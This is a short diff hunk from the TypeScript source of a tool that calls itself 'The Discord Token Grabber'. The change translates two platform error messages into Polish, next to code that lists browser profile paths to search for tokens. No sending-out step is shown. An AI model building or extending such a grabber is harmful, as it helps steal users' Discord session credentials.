@@ -64,9 +64,9 @@ export function grabDiscordToken() {
       Yandex: path.join(home + 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
     }
   } else if (computerPlatform == 'darwin') {
-    return console.log('MacOS is not supported for the moment 😥')
+    return console.log('MacOS nie jest wpierany w tej chwili 😥')
   } else {
-    return console.log('The Discord Token Grabber support only Windows, Linux and MacOS.')
+    return console.log('Nieznana platforma, nie mogę znaleźć tokenów.')
   }
 
   const tokens: { [key: string]: string[] } = {}
